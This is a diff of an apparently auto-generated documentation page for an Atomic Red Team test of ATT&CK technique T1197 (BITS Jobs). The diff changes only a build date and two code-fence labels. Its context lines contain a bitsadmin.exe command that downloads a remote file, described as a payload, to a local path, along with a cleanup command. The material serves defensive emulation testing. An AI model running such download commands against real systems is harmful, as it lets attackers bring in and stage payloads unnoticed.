@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1197"
 attack_technique_name: "BITS Jobs"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "3c73d728-75fb-4180-a12f-6712864d7421"
@@ -57,13 +57,13 @@ and execute a payload
 
 ### Command
 
-```commandprompt
+```cmd
 bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{local_file} >nul 2>&1
 ```
 
